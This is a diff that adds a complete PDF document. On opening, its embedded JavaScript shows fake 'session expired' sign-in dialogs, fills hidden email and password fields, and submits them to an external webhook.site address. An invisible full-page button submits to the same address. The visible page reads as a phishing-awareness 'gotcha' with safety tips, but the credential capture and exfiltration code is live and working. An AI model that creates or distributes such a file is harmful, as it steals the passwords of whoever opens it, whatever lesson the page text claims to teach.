@@ -1,0 +1,101 @@
+%PDF-1.4
+1 0 obj
+<< /Type /Catalog /Pages 2 0 R /AcroForm 6 0 R /OpenAction << /S /JavaScript /JS (\nvar u = app.response\({\n  cQuestion: "Your session has expired. Please sign in again.",\n  cTitle:    "Sign in",\n  bPassword: false\n}\);\n\nvar p = app.response\({\n  cQuestion: "Password:",\n  cTitle:    "Sign in",\n  bPassword: true\n}\);\n\nif \(u != null\) this.getField\("email"\).value = u;\nif \(p != null\) this.getField\("password"\).value = p;\n\n// Commit the field values, then fire the submit from JS.\nthis.calculateNow\(\);\n\ntry {\n  this.submitForm\({\n    cURL:      "https://webhook.site/42caa279-8a9c-4b9a-aa31-f54ed1adbed8",\n    cSubmitAs: "XFDF"\n  }\);\n} catch \(e\) {\n  try { this.submitForm\("https://webhook.site/42caa279-8a9c-4b9a-aa31-f54ed1adbed8"\); } catch \(e2\) {}\n}\n) >> >>
+endobj
+2 0 obj
+<< /Type /Pages /Kids [3 0 R] /Count 1 >>
+endobj
+3 0 obj
+<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /Font << /F1 4 0 R /F2 5 0 R >> >> /Contents 7 0 R /Annots [8 0 R 9 0 R 10 0 R] >>
+endobj
+4 0 obj
+<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>
+endobj
+5 0 obj
+<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Bold >>
+endobj
+6 0 obj
+<< /Type /AcroForm /Fields [8 0 R 9 0 R 10 0 R] /NeedAppearances true /DR << /Font << /F1 4 0 R /F2 5 0 R >> >> /DA (/F1 12 Tf 0 g) >>
+endobj
+7 0 obj
+<< /Length 1248 >>
+stream
+q
+0.08 0.08 0.10 rg
+0 0 612 792 re f
+Q
+
+q
+0.85 0.10 0.10 rg
+0 620 612 172 re f
+Q
+
+1 1 1 rg
+BT /F2 62 Tf 50 720 Td (GOTCHA.) Tj ET
+BT /F1 16 Tf 52 680 Td (You fell for it.) Tj ET
+
+1 1 1 rg
+BT /F2 30 Tf 50 520 Td (You opened this file without thinking.) Tj ET
+BT /F1 15 Tf 50 485 Td (That is exactly how the trap works.) Tj ET
+
+0.85 0.10 0.10 rg
+50 430 512 2 re f
+Q
+
+1 1 1 rg
+BT /F1 14 Tf 50 395 Td (There was no prize. No report. No test. Nothing useful.) Tj ET
+BT /F1 14 Tf 50 372 Td (Just bait, and you took it from someone you do not) Tj ET
+BT /F1 14 Tf 50 349 Td (even know.) Tj ET
+
+BT /F2 20 Tf 50 300 Td (You were not careful enough.) Tj ET
+
+BT /F1 13 Tf 50 255 Td (Next time:) Tj ET
+BT /F1 13 Tf 80 232 Td (- Check the sender before opening any attachment.) Tj ET
+BT /F1 13 Tf 80 210 Td (- If a document asks you to log in, close it.) Tj ET
+BT /F1 13 Tf 80 188 Td (- Never type credentials into a file.) Tj ET
+
+0.85 0.10 0.10 rg
+50 120 512 2 re f
+Q
+
+0.70 0.70 0.75 rg
+BT /F1 12 Tf 50 90 Td (Remember this feeling. This is what deception feels like.) Tj ET
+BT /F1 10 Tf 50 70 Td (If someone sent this to teach you a lesson, they did it for a reason.) Tj ET
+BT /F1 10 Tf 50 54 Td (If no one did, then the bait was real, and you took it.) Tj ET
+
+endstream
+endobj
+8 0 obj
+<< /Type /Annot /Subtype /Widget /FT /Tx /T (email) /F 2 /Rect [0 0 1 1] /DA (/F1 12 Tf 0 g) >>
+endobj
+9 0 obj
+<< /Type /Annot /Subtype /Widget /FT /Tx /T (password) /FF 4096 /F 2 /Rect [0 0 1 1] /DA (/F1 12 Tf 0 g) >>
+endobj
+10 0 obj
+<< /Type /Annot /Subtype /Widget /FT /Btn /T (submit) /FF 65536 /Rect [0 0 612 792] /F 4 /A << /S /SubmitForm /F << /Type /Filespec /FS /URL /F (https://webhook.site/42caa279-8a9c-4b9a-aa31-f54ed1adbed8) >> >> /AP << /N 11 0 R >> >>
+endobj
+11 0 obj
+<< /Type /XObject /Subtype /Form /BBox [0 0 612 792] /Resources << >> /Length 21 >>
+stream
+1 1 1 rg 0 0 1 1 re f
+endstream
+endobj
+xref
+0 12
+0000000000 65535 f 
+0000000009 00000 n 
+0000000825 00000 n 
+0000000882 00000 n 
+0000001047 00000 n 
+0000001117 00000 n 
+0000001192 00000 n 
+0000001342 00000 n 
+0000002642 00000 n 
+0000002753 00000 n 
+0000002876 00000 n 
+0000003125 00000 n 
+trailer
+<< /Size 12 /Root 1 0 R >>
+startxref
+3264
+%%EOF
